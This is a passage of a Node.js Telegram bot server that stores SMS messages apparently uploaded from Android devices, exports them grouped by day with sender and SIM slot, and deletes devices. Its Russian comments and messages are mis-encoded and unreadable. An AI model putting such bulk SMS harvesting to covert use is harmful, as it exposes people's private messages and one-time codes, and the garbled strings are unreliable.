    console.error('–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ SMS –¥–ª—è —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞:', error);
    await ctx.reply('–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ SMS –¥–ª—è —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞.');
  }
}

// 4. –≠–∫—Å–ø–æ—Ä—Ç –≤—Å–µ—Ö SMS –¥–ª—è —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
async function exportAllSms(ctx, deviceId) {
  try {
    const device = await Device.findOne({ deviceId });
    
    if (!device) {
      await ctx.editMessageText('–£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ –Ω–µ –Ω–∞–π–¥–µ–Ω–æ.', {
        reply_markup: {
          inline_keyboard: [
            [{ text: 'üì± –°–ø–∏—Å–æ–∫ —É—Å—Ç—Ä–æ–π—Å—Ç–≤', callback_data: 'devices' }]
          ]
        }
      });
      return;
    }
    
    // –ü–æ–ª—É—á–∞–µ–º –≤—Å–µ SMS –¥–ª—è —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
    const messages = await SmsMessage.find({ deviceId }).sort({ timestamp: -1 });
    
    if (messages.length === 0) {
      await ctx.editMessageText('SMS —Å–æ–æ–±—â–µ–Ω–∏—è –æ—Ç—Å—É—Ç—Å—Ç–≤—É—é—Ç.', {
        reply_markup: {
          inline_keyboard: [
            [{ text: 'üì± –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ–± —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ', callback_data: `device:${deviceId}` }]
          ]
        }
      });
      return;
    }
    
    // –§–æ—Ä–º–∏—Ä—É–µ–º —Ç–µ–∫—Å—Ç –¥–ª—è —ç–∫—Å–ø–æ—Ä—Ç–∞
    let exportText = `üì± *–≠–∫—Å–ø–æ—Ä—Ç SMS –¥–ª—è ${device.deviceModel}*\n`;
    exportText += `üìÖ *–î–∞—Ç–∞ —ç–∫—Å–ø–æ—Ä—Ç–∞:* ${moment().format('DD.MM.YYYY HH:mm')}\n`;
    exportText += `üì± *–£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ:* ${device.deviceModel} (${device.androidVersion})\n`;
    exportText += `‚úâÔ∏è *–í—Å–µ–≥–æ —Å–æ–æ–±—â–µ–Ω–∏–π:* ${messages.length}\n\n`;
    exportText += `----------------------------------------------------------\n\n`;
    
    // –ì—Ä—É–ø–ø–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏—è –ø–æ –¥–Ω—è–º –¥–ª—è —É–¥–æ–±—Å—Ç–≤–∞ —á—Ç–µ–Ω–∏—è
    const groupedMessages = {};
    for (const message of messages) {
      const date = moment(message.timestamp).format('DD.MM.YYYY');
      if (!groupedMessages[date]) {
        groupedMessages[date] = [];
      }
      groupedMessages[date].push(message);
    }
    
    // –§–æ—Ä–º–∏—Ä—É–µ–º —Ç–µ–∫—Å—Ç —Å –≥—Ä—É–ø–ø–∏—Ä–æ–≤–∫–æ–π –ø–æ –¥–Ω—è–º
    const dates = Object.keys(groupedMessages).sort((a, b) => 
      moment(b, 'DD.MM.YYYY').valueOf() - moment(a, 'DD.MM.YYYY').valueOf()
    );
    
    for (const date of dates) {
      exportText += `üìÖ *${date}*\n\n`;
      
      const dayMessages = groupedMessages[date].sort((a, b) => 
        b.timestamp.valueOf() - a.timestamp.valueOf()
      );
      
      for (const message of dayMessages) {
        exportText += `üïí ${moment(message.timestamp).format('HH:mm')}\n`;
        exportText += `üì± –û—Ç: ${message.sender}\n`;
        exportText += `üì∂ SIM${message.simSlot + 1}\n`;
        exportText += `üí¨ ${message.text}\n\n`;
      }
      
      exportText += `----------------------------------------------------------\n\n`;
    }
    
    // –ï—Å–ª–∏ —ç–∫—Å–ø–æ—Ä—Ç –æ—á–µ–Ω—å –±–æ–ª—å—à–æ–π, —Ä–∞–∑–±–∏–≤–∞–µ–º –Ω–∞ —á–∞—Å—Ç–∏
    const maxLength = 4000; // Telegram –æ–≥—Ä–∞–Ω–∏—á–∏–≤–∞–µ—Ç —Å–æ–æ–±—â–µ–Ω–∏—è –ø—Ä–∏–º–µ—Ä–Ω–æ –¥–æ 4096 —Å–∏–º–≤–æ–ª–æ–≤
    if (exportText.length > maxLength) {
      let parts = [];
      for (let i = 0; i < exportText.length; i += maxLength) {
        parts.push(exportText.substring(i, i + maxLength));
      }
      
      // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –ø–µ—Ä–≤—É—é —á–∞—Å—Ç—å —Å –∑–∞–º–µ–Ω–æ–π —Ç–µ–∫—É—â–µ–≥–æ —Å–æ–æ–±—â–µ–Ω–∏—è
      await ctx.editMessageText(`–ß–∞—Å—Ç—å 1/${parts.length}\n\n${parts[0]}`, {
        parse_mode: 'Markdown'
      });
      
      // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –æ—Å—Ç–∞–ª—å–Ω—ã–µ —á–∞—Å—Ç–∏ –∫–∞–∫ –Ω–æ–≤—ã–µ —Å–æ–æ–±—â–µ–Ω–∏—è
      for (let i = 1; i < parts.length; i++) {
        await ctx.reply(`–ß–∞—Å—Ç—å ${i + 1}/${parts.length}\n\n${parts[i]}`, {
          parse_mode: 'Markdown'
        });
      }
      
      // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∑–∞–≤–µ—Ä—à–∞—é—â–µ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ —Å –∫–Ω–æ–ø–∫–∞–º–∏
      await ctx.reply('–≠–∫—Å–ø–æ—Ä—Ç –∑–∞–≤–µ—Ä—à–µ–Ω', {
        reply_markup: {
          inline_keyboard: [
            [{ text: 'üì± –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ–± —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ', callback_data: `device:${deviceId}` }],
            [{ text: 'üì± –°–ø–∏—Å–æ–∫ —É—Å—Ç—Ä–æ–π—Å—Ç–≤', callback_data: 'back_to_devices' }],
            [{ text: 'üè† –ì–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é', callback_data: 'back_to_main' }]
          ]
        }
      });
    } else {
      await ctx.editMessageText(exportText, {
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [
            [{ text: 'üì± –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ–± —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ', callback_data: `device:${deviceId}` }],
            [{ text: 'üì± –°–ø–∏—Å–æ–∫ —É—Å—Ç—Ä–æ–π—Å—Ç–≤', callback_data: 'back_to_devices' }],
            [{ text: 'üè† –ì–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é', callback_data: 'back_to_main' }]
          ]
        }
      });
    }
  } catch (error) {
    console.error('–û—à–∏–±–∫–∞ –ø—Ä–∏ —ç–∫—Å–ø–æ—Ä—Ç–µ SMS:', error);
    await ctx.reply('–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ —ç–∫—Å–ø–æ—Ä—Ç–µ SMS.');
  }
}

// 5. –£–¥–∞–ª–µ–Ω–∏–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
async function deleteDevice(ctx, deviceId) {
  try {
    // –£–¥–∞–ª—è–µ–º —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ –∏ –≤—Å–µ –µ–≥–æ SMS
    await Device.deleteOne({ deviceId });
    await SmsMessage.deleteMany({ deviceId });
    
    await ctx.editMessageText('‚úÖ –£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ –∏ –≤—Å–µ –µ–≥–æ SMS —É—Å–ø–µ—à–Ω–æ —É–¥–∞–ª–µ–Ω—ã.', {
      reply_markup: {
        inline_keyboard: [
          [{ text: 'üì± –°–ø–∏—Å–æ–∫ —É—Å—Ç—Ä–æ–π—Å—Ç–≤', callback_data: 'back_to_devices' }],
          [{ text: 'üè† –ì–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é', callback_data: 'back_to_main' }]
        ]
      }
    });
  } catch (error) {
    console.error('–û—à–∏–±–∫–∞ –ø—Ä–∏ —É–¥–∞–ª–µ–Ω–∏–∏ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞:', error);
    await ctx.reply('–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ —É–¥–∞–ª–µ–Ω–∏–∏ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞.');
  }
}

// –ó–∞–ø—É—Å–∫ —Å–µ—Ä–≤–µ—Ä–∞
app.listen(PORT, () => {
  console.log(`–°–µ—Ä–≤–µ—Ä –∑–∞–ø—É—â–µ–Ω –Ω–∞ –ø–æ—Ä—Ç—É ${PORT}`);
});

// –ó–∞–ø—É—Å–∫ –±–æ—Ç–∞
bot.launch()
  .then(() => console.log('Telegram –±–æ—Ç –∑–∞–ø—É—â–µ–Ω'))
  .catch(err => console.error('–û—à–∏–±–∫–∞ –∑–∞–ø—É—Å–∫–∞ Telegram –±–æ—Ç–∞:', err));

// –û–±—Ä–∞–±–æ—Ç–∫–∞ —Å–∏–≥–Ω–∞–ª–æ–≤ –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM')); 
